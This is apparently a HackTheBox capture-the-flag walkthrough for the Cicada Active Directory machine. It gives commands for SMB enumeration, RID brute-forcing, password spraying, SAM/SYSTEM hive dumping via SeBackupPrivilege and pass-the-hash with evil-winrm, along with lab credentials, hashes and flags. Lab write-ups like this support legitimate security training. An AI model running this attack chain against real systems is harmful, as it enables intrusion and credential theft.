# Cicada HTB Walkthrough

A comprehensive penetration testing walkthrough for the Cicada machine from HackTheBox.

## Overview

Cicada is a medium-difficulty Windows Active Directory machine that involves comprehensive enumeration, password reuse exploitation, and privilege escalation through backup privileges.

**Target IP:** `10.129.11.232`  
**Domain:** `CICADA-DC.cicada.htb`

## Reconnaissance

### Network Scanning

Initial port discovery using aggressive Nmap scan:

```bash
export target=10.129.11.232
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="448" height="60" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />

<img width="492" height="414" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />

**Discovered Open Ports:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 50845

### Service Enumeration

Comprehensive service version detection and script scanning:

```bash
sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,50845 -T4 $target
```

<img width="942" height="828" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />

**Key Services Identified:**
- **Port 53:** DNS Service
- **Port 88:** Kerberos Authentication
- **Port 139/445:** SMB File Sharing
- **Port 389/636:** LDAP/LDAPS
- **Port 5985:** WinRM (Windows Remote Management)

### SMB Enumeration

Anonymous SMB share enumeration revealed accessible shares:

```bash
smbclient -N -L //10.129.11.232/
```

<img width="934" height="725" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />

**Available Shares:**
- ADMIN$ (Remote Admin)
- C$ (Default share)
- DEV (Development Share)
- HR (Human Resources Share)
- IPC$ (Remote IPC)
- NETLOGON (Logon server share)
- SYSVOL (Logon server share)

## Initial Access

### HR Share Examination

The HR share contained a welcome notice with default credentials:

```bash
smbclient //10.129.11.232/HR
cat "Notice from HR.txt"
```

<img width="934" height="725" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />

<img width="952" height="541" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />

**Credentials Discovered:**  
Default password pattern: `Cicada$M6Corpb*@Lp#nZp!8`

### User Enumeration

RID brute-forcing to discover domain users:

```bash
crackmapexec smb $target -u 'guest' -p '' --rid-brute 2>/dev/null
```

<img width="952" height="688" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />

**Discovered Domain Users:**
- Administrator
- Guest
- krbtgt
- CICADA-DC$
- john.smoulder
- sarah.dantelia
- michael.wrightson
- david.orelious
- emily.oscars

### Credential Spraying

Password spraying with discovered default credentials:

```bash
crackmapexec smb $target -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success 2>/dev/null
```

<img width="953" height="405" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />

**Valid Credentials Found:**  
`michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

## Lateral Movement

### Additional Credential Discovery

Further enumeration revealed another user's credentials:

```bash
crackmapexec smb $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users 2>/dev/null
```

<img width="951" height="343" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />

<img width="957" height="289" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />

**Additional Credentials:**  
`david.orelious:aRt$Lp#7t*VQ!3`

### DEV Share Access

Accessing the DEV share with David's credentials:

```bash
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.129.11.232/DEV
```

<img width="916" height="289" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />

**Discovered File:** `Backup_script.ps1`

### Backup Script Analysis

The PowerShell backup script contained hardcoded credentials:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

**New Credentials:** `emily.oscars:Q!3@Lp#M6b*7t*Vt`

### WinRM Access

Testing WinRM access with Emily's credentials:

```bash
crackmapexec winrm $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' 2>/dev/null
evil-winrm -i $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

<img width="948" height="185" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />

<img width="952" height="579" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />

**User Flag:** `3692d04e5db2d48dadce05ee6a469235`

## Privilege Escalation

### Privilege Assessment

Checking user privileges:

```powershell
whoami /priv
```

**Key Privileges:**
- SeBackupPrivilege (Enabled)
- SeRestorePrivilege (Enabled)
- SeShutdownPrivilege (Enabled)
- SeChangeNotifyPrivilege (Enabled)
- SeIncreaseWorkingSetPrivilege (Enabled)

### SAM Database Extraction

Utilizing SeBackupPrivilege to extract SAM and SYSTEM hives:

```powershell
reg save HKLM\SAM C:\Users\emily.oscars.CICADA\Documents\sam
reg save HKLM\SYSTEM C:\Users\emily.oscars.CICADA\Documents\SYSTEM
```

<img width="950" height="395" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />

### Credential Extraction

Using Impacket to extract password hashes:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

<img width="711" height="197" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />

**Administrator NTLM Hash:** `2b87e7c93a3e8a0ea4a581937016f341`

### Administrator Access

Pass-the-hash attack using Evil-WinRM:

```bash
evil-winrm -i $target -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

<img width="952" height="695" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />

**Root Flag:** `ff17e2ce0fc4b8e1f0fb7947aa0dd60a`

## Conclusion

The Cicada machine demonstrated several critical security issues:

1. **Information Disclosure:** Default passwords in HR documentation
2. **Password Reuse:** Multiple users sharing similar password patterns
3. **Hardcoded Credentials:** Sensitive credentials in backup scripts
4. **Excessive Privileges:** Backup privileges granted to standard users
5. **Weak Access Controls:** Insufficient restriction of sensitive operations

### Security Recommendations

- Implement proper password policies with complexity requirements
- Avoid hardcoded credentials in scripts and configuration files
- Follow principle of least privilege for user accounts
- Regularly audit and monitor privileged operations
- Implement credential management solutions
- Conduct regular security awareness training

---
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
